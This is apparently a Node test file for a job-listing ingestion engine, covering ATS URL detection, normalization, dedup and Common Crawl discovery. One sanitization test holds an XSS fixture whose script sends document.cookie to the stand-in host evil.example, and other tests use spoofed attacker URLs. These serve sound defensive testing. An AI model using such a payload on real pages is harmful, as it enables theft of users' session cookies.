// Seen Job Ingestion engine — tests. Run: node --test lib/jobs/jobs.test.mjs
//
// Covers the non-negotiables: ATS detection + tenant extraction, employer-direct provider
// normalization with provenance, malicious-payload sanitization, multi-source canonical dedup
// (same vacancy → one employer-direct row; same title / different requisition → two), provider
// failure isolation, and Common Crawl CDX tenant parsing. No live network — providers take an
// injected fetch.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { detectAts, isAggregatorUrl, INGESTABLE_PROVIDERS } from './atsDetect.js';
import { greenhouse, lever, ashby, fetchSourceJobs } from './atsProviders.js';
import { fingerprint, dedupJobs } from './expand.js';
import { tenantsFromCdx, discoverFromCommonCrawl } from './discovery.js';
import { pageFor, summarizeAdzunaProbe } from '../../api/discover-sources.js';

// A fetch that returns the same JSON for any URL (single-call providers).
const mockFetch = (payload, { ok = true } = {}) => async () => ({ ok, json: async () => payload, text: async () => (typeof payload === 'string' ? payload : JSON.stringify(payload)) });

// ── ATS detection ─────────────────────────────────────────────────────────────
test('detectAts extracts provider + tenant from real ATS URLs', () => {
  const cases = [
    ['https://boards.greenhouse.io/target/jobs/123', 'greenhouse', 'target'],
    ['https://job-boards.greenhouse.io/stripe', 'greenhouse', 'stripe'],
    ['https://jobs.lever.co/netflix/abc-123', 'lever', 'netflix'],
    ['https://jobs.ashbyhq.com/linear/some-uuid', 'ashby', 'linear'],
    ['https://apply.workable.com/acme/', 'workable', 'acme'],
    ['https://careers.smartrecruiters.com/Bosch', 'smartrecruiters', 'bosch'],
    ['https://acme.recruitee.com/o/engineer', 'recruitee', 'acme'],
    ['https://tesla.wd1.myworkdayjobs.com/en-US/Tesla/job', 'workday', 'tesla'],
  ];
  for (const [url, provider, tenant] of cases) {
    const hit = detectAts(url);
    assert.ok(hit, `no detect for ${url}`);
    assert.equal(hit.provider, provider, `provider for ${url}`);
    assert.equal(hit.tenant, tenant, `tenant for ${url}`);
    assert.equal(hit.sourceType, 'ATS_DIRECT');
  }
  // ingestable flag: greenhouse yes, workday no (detected but not yet pulled directly)
  assert.equal(detectAts('https://boards.greenhouse.io/target').ingestable, true);
  assert.equal(detectAts('https://tesla.wd1.myworkdayjobs.com/Tesla').ingestable, false);
  assert.ok(INGESTABLE_PROVIDERS.has('greenhouse') && !INGESTABLE_PROVIDERS.has('workday'));
});

test('detectAts rejects non-ATS + reserved-word tenants, and flags aggregators', () => {
  assert.equal(detectAts('https://tesla.com/careers'), null);
  assert.equal(detectAts('https://www.google.com/search'), null);
  assert.equal(detectAts('not a url'), null);
  // SECURITY: a spoofed host must NEVER be mis-detected as an ATS (host is anchored, not substring).
  assert.equal(detectAts('https://boards.greenhouse.io.evil.com/target'), null, 'suffix-spoof host rejected');
  assert.equal(detectAts('https://evil.com/boards.greenhouse.io/target'), null, 'path-embedded host rejected');
  assert.equal(detectAts('https://evil.com/?x=jobs.lever.co/netflix'), null, 'query-embedded host rejected');
  // aggregator redirect URLs are NOT employer-direct
  assert.equal(isAggregatorUrl('https://www.adzuna.com/land/ad/123'), true);
  assert.equal(isAggregatorUrl('https://www.indeed.com/viewjob?jk=abc'), true);
  assert.equal(isAggregatorUrl('https://boards.greenhouse.io/target/jobs/1'), false);
});

// ── Provider normalization + provenance ────────────────────────────────────────
const DESC = 'Prevent theft and protect company assets. Conduct surveillance, write incident reports, and de-escalate difficult situations across the sales floor during every shift.';

test('Greenhouse provider normalizes to a canonical row with employer-direct provenance', async () => {
  const payload = { jobs: [{ id: 5001, title: 'Assets Protection Specialist', location: { name: 'Los Angeles, CA' }, absolute_url: 'https://boards.greenhouse.io/target/jobs/5001', content: `<p>${DESC}</p>` }] };
  const rows = await greenhouse.fetchCompanyJobs('target', { companyName: 'Target', fetchImpl: mockFetch(payload) });
  assert.equal(rows.length, 1);
  const r = rows[0];
  assert.equal(r.title, 'Assets Protection Specialist');
  assert.equal(r.company, 'Target');
  assert.equal(r.apply_url, 'https://boards.greenhouse.io/target/jobs/5001');
  assert.equal(r.source, 'Greenhouse');
  assert.equal(r.source_type, 'ATS_DIRECT');
  assert.equal(r.ats_provider, 'greenhouse');
  assert.equal(r.ats_tenant, 'target');
  assert.equal(r.external_id, '5001');
  assert.ok(r.description.length > 80 && !/[<>]/.test(r.description), 'description cleaned');
});

test('Lever + Ashby providers normalize from their real shapes', async () => {
  const lrows = await lever.fetchCompanyJobs('netflix', { companyName: 'Netflix', fetchImpl: mockFetch([
    { id: 'l-1', text: 'Software Engineer', categories: { location: 'Remote', commitment: 'Full-time' }, hostedUrl: 'https://jobs.lever.co/netflix/l-1', applyUrl: 'https://jobs.lever.co/netflix/l-1/apply', descriptionPlain: DESC },
  ]) });
  assert.equal(lrows.length, 1);
  assert.equal(lrows[0].ats_provider, 'lever');
  assert.equal(lrows[0].external_id, 'l-1');
  assert.equal(lrows[0].apply_url, 'https://jobs.lever.co/netflix/l-1/apply');

  const arows = await ashby.fetchCompanyJobs('linear', { companyName: 'Linear', fetchImpl: mockFetch({ jobs: [
    { id: 'a-9', title: 'Product Designer', location: 'San Francisco', isRemote: false, jobUrl: 'https://jobs.ashbyhq.com/linear/a-9', descriptionPlain: DESC, employmentType: 'FullTime' },
  ] }) });
  assert.equal(arows.length, 1);
  assert.equal(arows[0].ats_provider, 'ashby');
  assert.equal(arows[0].external_id, 'a-9');
});

// ── Malicious payload sanitization ─────────────────────────────────────────────
test('a malicious ATS description is sanitized (no script/HTML survives)', async () => {
  const evil = `<script>fetch('https://evil.example/'+document.cookie)</script>${DESC}<img src=x onerror=alert(1)>`;
  const rows = await greenhouse.fetchCompanyJobs('acme', { companyName: 'Acme', fetchImpl: mockFetch({ jobs: [{ id: 1, title: 'Engineer', location: { name: 'NY' }, absolute_url: 'https://boards.greenhouse.io/acme/jobs/1', content: evil }] }) });
  assert.equal(rows.length, 1);
  const d = rows[0].description;
  assert.ok(!/<script/i.test(d) && !/onerror/i.test(d) && !/[<>]/.test(d), `unsafe content survived: ${d}`);
});

// ── Multi-source canonical dedup ───────────────────────────────────────────────
test('dedup merges the same vacancy across sources but keeps distinct requisitions', () => {
  const gh = { title: 'Software Engineer', company: 'Acme', location: 'Los Angeles, CA', ats_provider: 'greenhouse', external_id: '100', apply_url: 'https://boards.greenhouse.io/acme/jobs/100' };
  const gh2 = { ...gh, external_id: '101', apply_url: 'https://boards.greenhouse.io/acme/jobs/101' };
  const adzunaDup = { title: 'Software Engineer', company: 'Acme', location: 'Los Angeles, CA', source: 'Adzuna', apply_url: 'https://adzuna.com/redirect/xyz' };

  // same vacancy from greenhouse + adzuna → ONE (employer-direct kept, aggregator dup dropped)
  const one = dedupJobs([gh, adzunaDup]);
  assert.equal(one.length, 1);
  assert.equal(one[0].ats_provider, 'greenhouse');

  // two greenhouse requisitions, same title/location → TWO
  const two = dedupJobs([gh, gh2]);
  assert.equal(two.length, 2);

  // both branches together → REQ-100, REQ-101, and the aggregator dup collapses into the reqs
  const all = dedupJobs([gh, gh2, adzunaDup]);
  assert.equal(all.length, 2);

  // two aggregator rows of the same job (no requisitions) → ONE
  assert.equal(dedupJobs([adzunaDup, { ...adzunaDup, apply_url: 'https://adzuna.com/redirect/abc' }]).length, 1);
});

test('fingerprint is case/whitespace-insensitive on title|company|location', () => {
  assert.equal(fingerprint({ title: ' Nurse ', company: 'HCA', location: 'Austin' }), fingerprint({ title: 'nurse', company: 'hca', location: 'austin' }));
});

// ── Provider failure isolation ─────────────────────────────────────────────────
test('a provider error is isolated — never throws, yields empty rows (circuit breaker sees no jobs)', async () => {
  const throwing = async () => { throw new Error('network down'); };
  // A network error is swallowed to empty rows (robust isolation) — it never throws, so one dead
  // provider can never break a multi-source fan-out. The cron treats empty rows as a soft failure,
  // so the circuit breaker still degrades a persistently-failing source.
  const r = await fetchSourceJobs({ provider: 'greenhouse', tenant: 'x', companyName: 'X' }, { fetchImpl: throwing });
  assert.ok(Array.isArray(r.rows) && r.rows.length === 0, 'network error → empty rows, no throw');
  // unknown provider → ok:false, no throw
  const u = await fetchSourceJobs({ provider: 'nope', tenant: 'x' });
  assert.equal(u.ok, false);
  assert.deepEqual(u.rows, []);
  // a non-ok HTTP response → empty rows, no throw
  const empty = await greenhouse.fetchCompanyJobs('x', { fetchImpl: mockFetch(null, { ok: false }) });
  assert.deepEqual(empty, []);
});

// ── Common Crawl CDX parsing ───────────────────────────────────────────────────
test('tenantsFromCdx extracts ingestable tenants from a CDX JSONL response', () => {
  const jsonl = [
    JSON.stringify({ url: 'https://boards.greenhouse.io/airbnb/jobs/42', status: '200' }),
    JSON.stringify({ url: 'https://jobs.lever.co/spotify', status: '200' }),
    JSON.stringify({ url: 'https://boards.greenhouse.io/airbnb/jobs/43', status: '200' }), // dup tenant
    JSON.stringify({ url: 'https://tesla.wd1.myworkdayjobs.com/x', status: '200' }), // workday → not ingestable, skipped
    JSON.stringify({ url: 'https://boards.greenhouse.io/dead/jobs/1', status: '404' }), // non-200 skipped
    'not json',
  ].join('\n');
  const tenants = tenantsFromCdx(jsonl);
  const keys = tenants.map((t) => `${t.provider}:${t.tenant}`).sort();
  assert.deepEqual(keys, ['greenhouse:airbnb', 'lever:spotify']);
});

// ── Common Crawl discovery sweep ───────────────────────────────────────────────
// These lock the four defects that kept company_sources at 27 hand-typed seeds with ZERO
// crawl-discovered boards: a page that never rotated, a deadline the sweep ignored, an
// upsert tally masquerading as a new-board count, and a summary that could not tell
// "Common Crawl unreachable" from "found nothing new".

// A fetch that serves the collection index, then CDX rows per pattern, recording every URL asked for.
function crawlFetch({ collinfo = [{ id: 'CC-MAIN-2026-33' }], rows = {}, delayMs = 0, failCollinfo = false, pages = 1, maxPage = null } = {}) {
  const calls = [];
  const impl = async (url) => {
    calls.push(url);
    if (delayMs) await new Promise((r) => setTimeout(r, delayMs));
    if (url.includes('collinfo.json')) {
      return failCollinfo
        ? { ok: false, status: 503, text: async () => '' }
        : { ok: true, status: 200, text: async () => JSON.stringify(collinfo) };
    }
    if (url.includes('showNumPages=true')) {
      return { ok: true, status: 200, text: async () => JSON.stringify({ pages, pageSize: 5, blocks: 5 }) };
    }
    // Real CDX behaviour: a page past the end is a hard 400, not an empty body.
    if (maxPage != null) {
      const asked = Number(/[?&]page=(\d+)/.exec(url)?.[1] ?? 0);
      if (asked > maxPage) {
        return { ok: false, status: 400, text: async () => JSON.stringify({ message: `Page ${asked} invalid: First Page is 0, Last Page is ${maxPage}` }) };
      }
    }
    const hit = Object.keys(rows).find((k) => url.includes(encodeURIComponent(k)));
    return { ok: true, status: 200, text: async () => (hit ? rows[hit] : '') };
  };
  impl.calls = calls;
  return impl;
}

const cdxRow = (u) => JSON.stringify({ url: u, status: '200' });

test('discoverFromCommonCrawl reports no_crawl_id when the collection index is unreachable', async () => {
  const fetchImpl = crawlFetch({ failCollinfo: true });
  const out = await discoverFromCommonCrawl({ fetchImpl });
  assert.equal(out.reason, 'no_crawl_id');
  assert.equal(out.crawl, null);
  assert.equal(out.patterns_swept, 0, 'must not sweep any pattern without a crawl id');
});

// THE REGRESSION THIS FILE EXISTS TO PREVENT. #273 sent `page` verbatim on the assumption that the
// CDX index had many pages. boards.greenhouse.io/* has exactly ONE ({"pages":1}), so the rotated
// cursor reached 36 and every request 400ed for hours — at 116ms, looking like a fast clean sweep.
test('the rotation hint is clamped to the pattern real page count, never sent past the end', async () => {
  const onePage = crawlFetch({ pages: 1, maxPage: 0 });
  const out = await discoverFromCommonCrawl({ fetchImpl: onePage, page: 36, patterns: ['boards.greenhouse.io/*'] });
  const dataCalls = onePage.calls.filter((u) => u.includes('-index?') && !u.includes('showNumPages'));
  assert.equal(dataCalls.length, 1);
  assert.ok(dataCalls[0].includes('&page=0'), `cursor not clamped: ${dataCalls[0]}`);
  assert.deepEqual(out.pages_used, [0]);
  assert.notEqual(out.reason, 'cdx_error', 'a clamped sweep must not 400');

  // And rotation still works where pages genuinely exist: 7 % 10 === 7.
  const tenPages = crawlFetch({ pages: 10, maxPage: 9 });
  await discoverFromCommonCrawl({ fetchImpl: tenPages, page: 7, patterns: ['boards.greenhouse.io/*'] });
  const rotated = tenPages.calls.filter((u) => u.includes('-index?') && !u.includes('showNumPages'));
  assert.ok(rotated[0].includes('&page=7'), `rotation lost: ${rotated[0]}`);

  // Wrap: 12 % 10 === 2.
  const wrapped = crawlFetch({ pages: 10, maxPage: 9 });
  await discoverFromCommonCrawl({ fetchImpl: wrapped, page: 12, patterns: ['boards.greenhouse.io/*'] });
  const wrapCalls = wrapped.calls.filter((u) => u.includes('-index?') && !u.includes('showNumPages'));
  assert.ok(wrapCalls[0].includes('&page=2'), `wrap wrong: ${wrapCalls[0]}`);
});

// THE MISLABEL. A refused query parsed to zero tenants and was reported as no_tenants/detail=null —
// "swept fine, found nothing" — for a query the server rejected outright. Fourth instance of the
// silent-zero class, and the first inside code written to end it.
test('a CDX HTTP error is reason=cdx_error, never no_tenants', async () => {
  // pageCount lookup succeeds but the data request is refused (simulates the live page=36 400).
  const refusing = crawlFetch({ pages: 40, maxPage: 0 });
  const out = await discoverFromCommonCrawl({ fetchImpl: refusing, page: 36, patterns: ['boards.greenhouse.io/*', 'jobs.lever.co/*'] });

  assert.equal(out.discovered, 0);
  assert.notEqual(out.reason, 'no_tenants', 'a 400 must never be labelled no_tenants');
  assert.equal(out.reason, 'cdx_error');
  assert.match(out.detail, /http_400/);
  assert.equal(out.pattern_errors.length, 2);
  assert.ok(out.pattern_errors.every((e) => e.includes('http_400')), out.pattern_errors.join(' | '));
  assert.equal(out.patterns_swept, 2, 'a refused pattern was still attempted');
});

test('no_tenants requires that every attempted pattern actually returned 200', async () => {
  const clean = crawlFetch({ pages: 1, maxPage: 0 });
  const out = await discoverFromCommonCrawl({ fetchImpl: clean, patterns: ['boards.greenhouse.io/*'] });
  assert.equal(out.reason, 'no_tenants');
  assert.deepEqual(out.pattern_errors, []);
  assert.equal(out.detail, null);
});

test('discoverFromCommonCrawl stops at the deadline instead of sweeping every pattern', async () => {
  // 5 patterns x 40ms, but only ~60ms of budget: it must break early and say why.
  const fetchImpl = crawlFetch({ delayMs: 40 });
  const patterns = ['boards.greenhouse.io/*', 'jobs.lever.co/*', 'jobs.ashbyhq.com/*', 'apply.workable.com/*', 'careers.smartrecruiters.com/*'];
  const out = await discoverFromCommonCrawl({ fetchImpl, patterns, deadline: Date.now() + 60 });
  assert.equal(out.reason, 'deadline');
  assert.ok(out.patterns_swept < patterns.length, `swept ${out.patterns_swept}/${patterns.length} — deadline ignored`);
  assert.equal(out.patterns_total, patterns.length);
});

test('discoverFromCommonCrawl counts only genuinely new boards, not re-upserted known ones', async () => {
  const fetchImpl = crawlFetch({
    rows: {
      'boards.greenhouse.io/*': [cdxRow('https://boards.greenhouse.io/airbnb/jobs/1'), cdxRow('https://boards.greenhouse.io/stripe/jobs/2')].join('\n'),
    },
  });
  const registered = [];
  const out = await discoverFromCommonCrawl({
    fetchImpl,
    patterns: ['boards.greenhouse.io/*'],
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    // greenhouse|airbnb is already registered; only stripe is new.
    existingKeysImpl: async () => new Set(['greenhouse|airbnb']),
    registerImpl: async (e) => { registered.push(`${e.provider}|${e.tenant}`); return true; },
  });
  assert.equal(out.discovered, 2, 'both tenants seen');
  assert.equal(out.registered, 2, 'both upserted (merge-duplicates refreshes the known one)');
  assert.equal(out.new_boards, 1, 'but only one is genuinely new');
  assert.equal(out.reason, 'ok');
  assert.deepEqual(registered.sort(), ['greenhouse|airbnb', 'greenhouse|stripe']);
});

test('discoverFromCommonCrawl distinguishes all_known from no_tenants', async () => {
  const known = crawlFetch({ rows: { 'boards.greenhouse.io/*': cdxRow('https://boards.greenhouse.io/airbnb/jobs/1') } });
  const a = await discoverFromCommonCrawl({
    fetchImpl: known, patterns: ['boards.greenhouse.io/*'],
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    existingKeysImpl: async () => new Set(['greenhouse|airbnb']),
    registerImpl: async () => true,
  });
  assert.equal(a.reason, 'all_known');
  assert.equal(a.new_boards, 0);

  const b = await discoverFromCommonCrawl({ fetchImpl: crawlFetch(), patterns: ['boards.greenhouse.io/*'] });
  assert.equal(b.reason, 'no_tenants');
  assert.equal(b.discovered, 0);
});

// (discoveryPageFor lived in api/refresh-jobs.js and is gone with the tail-end discovery path;
//  the surviving rotation hint is api/discover-sources.js's pageFor, covered above.)

test('discoverFromCommonCrawl reports WHY the crawl id could not be read', async () => {
  // HTTP failure — the case that is currently silent in production.
  const http503 = await discoverFromCommonCrawl({
    fetchImpl: async () => ({ ok: false, status: 503, text: async () => '' }),
  });
  assert.equal(http503.reason, 'no_crawl_id');
  assert.equal(http503.detail, 'http_503');

  // Reachable but not the JSON we expect (a proxy interstitial, an HTML error page).
  const htmlBody = await discoverFromCommonCrawl({
    fetchImpl: async () => ({ ok: true, status: 200, text: async () => '<html>blocked by proxy</html>' }),
  });
  assert.equal(htmlBody.reason, 'no_crawl_id');
  assert.match(htmlBody.detail, /^parse_error: /);

  // Valid JSON, wrong shape.
  const wrongShape = await discoverFromCommonCrawl({
    fetchImpl: async () => ({ ok: true, status: 200, text: async () => '{"collections":[]}' }),
  });
  assert.equal(wrongShape.reason, 'no_crawl_id');
  assert.match(wrongShape.detail, /^unexpected_shape: /);

  // Network throw.
  const threw = await discoverFromCommonCrawl({
    fetchImpl: async () => { const e = new Error('connect ECONNREFUSED'); e.name = 'FetchError'; throw e; },
  });
  assert.equal(threw.reason, 'no_crawl_id');
  assert.match(threw.detail, /^FetchError: /);
});

// ── Concurrent pattern sweep + the dedicated discovery endpoint ────────────────
// The sweep was serial, and the seven CDX patterns measure 19.3s wall-clock that way at limit=3
// (smartrecruiters 9.0s, recruitee 7.0s on their own — index seek time, not row transfer, so it does
// not shrink at limit=300). That is why discovery could never fit in the refresh handler's leftovers.

test('discoverFromCommonCrawl sweeps patterns concurrently, not serially', async () => {
  const DELAY = 60;
  let inFlight = 0, peak = 0;
  const fetchImpl = async (url) => {
    if (url.includes('collinfo.json')) return { ok: true, status: 200, text: async () => JSON.stringify([{ id: 'CC-MAIN-2026-33' }]) };
    inFlight++; peak = Math.max(peak, inFlight);
    await new Promise((r) => setTimeout(r, DELAY));
    inFlight--;
    return { ok: true, status: 200, text: async () => '' };
  };
  const patterns = ['a/*', 'b/*', 'c/*', 'd/*', 'e/*', 'f/*', 'g/*'];
  const t0 = Date.now();
  const out = await discoverFromCommonCrawl({ fetchImpl, patterns, concurrency: 4 });
  const elapsed = Date.now() - t0;

  assert.equal(out.patterns_swept, 7, 'every pattern should be swept');
  assert.ok(peak > 1, `patterns ran serially (peak in-flight ${peak})`);
  assert.ok(peak <= 4, `concurrency cap exceeded (peak in-flight ${peak})`);
  // Serial would be >= 7*60 = 420ms; at concurrency 4 it is two waves, ~120ms.
  assert.ok(elapsed < 7 * DELAY, `no speedup: ${elapsed}ms vs serial floor ${7 * DELAY}ms`);
});

test('a pattern skipped for budget is reported as skipped, not as swept-and-empty', async () => {
  const fetchImpl = crawlFetch({ delayMs: 40 });
  const patterns = ['a/*', 'b/*', 'c/*', 'd/*', 'e/*', 'f/*'];
  const out = await discoverFromCommonCrawl({ fetchImpl, patterns, concurrency: 2, deadline: Date.now() + 60 });
  assert.equal(out.reason, 'deadline');
  assert.ok(out.patterns_swept < patterns.length, `swept ${out.patterns_swept}/${patterns.length} — deadline ignored`);
  assert.equal(out.patterns_total, patterns.length);
});

test('discover-sources pageFor advances once per cron interval and wraps at 40', () => {
  const iv = 12 * 60 * 60 * 1000;
  const base = 900_000 * iv;
  assert.equal(pageFor(base + iv, iv), (pageFor(base, iv) + 1) % 40, 'consecutive runs must not rescan a page');
  assert.equal(pageFor(base + 40 * iv, iv), pageFor(base, iv), 'wraps after 40');
  assert.equal(pageFor(base + 60_000, iv), pageFor(base, iv), 'stable within one interval');
});

test('pattern_pages makes a mixed pages_used self-interpreting', async () => {
  // Two patterns with DIFFERENT real page counts and the same hint — exactly the [0,1] the owner saw.
  // 36 % 1 === 0 and 36 % 5 === 1, so a mixed pages_used is correct clamping, not an off-by-one.
  const fetchImpl = async (url) => {
    if (url.includes('collinfo.json')) return { ok: true, status: 200, text: async () => JSON.stringify([{ id: 'CC-MAIN-2026-33' }]) };
    const onePage = url.includes(encodeURIComponent('boards.greenhouse.io/*'));
    if (url.includes('showNumPages=true')) {
      return { ok: true, status: 200, text: async () => JSON.stringify({ pages: onePage ? 1 : 5 }) };
    }
    const asked = Number(/[?&]page=(\d+)/.exec(url)?.[1] ?? 0);
    const last = onePage ? 0 : 4;
    if (asked > last) return { ok: false, status: 400, text: async () => `Page ${asked} invalid: First Page is 0, Last Page is ${last}` };
    return { ok: true, status: 200, text: async () => '' };
  };
  const out = await discoverFromCommonCrawl({
    fetchImpl, page: 36, patterns: ['boards.greenhouse.io/*', 'jobs.lever.co/*'],
  });
  assert.deepEqual(out.pages_used, [0, 1]);
  assert.equal(out.pattern_pages['boards.greenhouse.io/*'], '1->0');
  assert.equal(out.pattern_pages['jobs.lever.co/*'], '5->1');
  assert.deepEqual(out.pattern_errors, [], 'clamping must never produce a 400');
});

// ── The silent-zero guard on the Adzuna probe ──────────────────────────────────
// Both the owner (from a Mac) and Claude (in api/discover-sources.js) independently wrote this probe
// so that a non-2xx counted as a successful resolution. Adzuna 403s bots, so 50 refusals read as
// "50 resolutions to adzuna.com, 0% ATS" — a decisive-looking number that would have killed the
// designated 50k path on nothing. Naming the class did not stop either of us writing it, so it is
// pinned here instead of trusted to care.

test('a blocked probe reports blocked_yield_unknown, never a 0% yield', () => {
  const blocked = Array.from({ length: 50 }, () => ({ shape: 'details', resolved: false, blocked: true, status: 403 }));
  const out = summarizeAdzunaProbe(blocked);

  assert.equal(out.verdict, 'blocked_yield_unknown');
  assert.equal(out.resolved, 0);
  assert.equal(out.blocked, 50);
  // THE line that matters: unknown must be null, never a persuasive zero.
  assert.equal(out.ats_ingestable_rate, null, '0 refusals must not read as 0% yield');
  assert.equal(out.ats_ingestable_hits, 0);
  assert.deepEqual(out.http_status_histogram, { 403: 50 });
  assert.deepEqual(out.destination_hosts, {}, 'a refused request has no destination');
});

test('a genuine zero yield is reported differently from a block', () => {
  const resolvedNoAts = Array.from({ length: 10 }, () => ({
    shape: 'details', resolved: true, blocked: false, status: 200, host: 'adzuna.com', body_providers: [],
  }));
  const out = summarizeAdzunaProbe(resolvedNoAts);
  assert.equal(out.verdict, 'resolved_but_no_ats_in_destination_or_body');
  assert.equal(out.ats_ingestable_rate, 0, 'a real zero IS zero — only unknown is null');
  assert.deepEqual(out.destination_hosts, { 'adzuna.com': 10 });
});

test('the ATS rate is computed over resolved responses only, and body hits count', () => {
  const mixed = [
    { shape: 'details', resolved: true, blocked: false, status: 200, host: 'boards.greenhouse.io', final_provider: 'greenhouse' },
    { shape: 'details', resolved: true, blocked: false, status: 200, host: 'adzuna.com', body_providers: ['lever'] },
    { shape: 'land_ad', resolved: true, blocked: false, status: 200, host: 'adzuna.com', body_providers: [] },
    { shape: 'land_ad', resolved: false, blocked: true, status: 403 },
    { shape: 'land_ad', resolved: false, blocked: false, status: null, error: 'TimeoutError' },
  ];
  const out = summarizeAdzunaProbe(mixed);
  assert.equal(out.verdict, 'ats_recoverable');
  assert.equal(out.resolved, 3);
  assert.equal(out.blocked, 1);
  assert.equal(out.threw, 1);
  // 2 hits over 3 RESOLVED — the two unresolved must not dilute the denominator.
  assert.equal(out.ats_ingestable_hits, 2);
  assert.equal(out.ats_ingestable_rate, 0.667);
  assert.deepEqual(out.providers, { greenhouse: 1, lever: 1 });
  assert.deepEqual(out.http_status_histogram, { 200: 3, 403: 1, threw: 1 });
  // Both stub shapes tracked separately — the corpus is 11,734 /details/ + 8,598 /land/ad/.
  assert.equal(out.by_shape.details.sampled, 2);
  assert.equal(out.by_shape.land_ad.sampled, 3);
  assert.equal(out.by_shape.land_ad.blocked, 1);
});
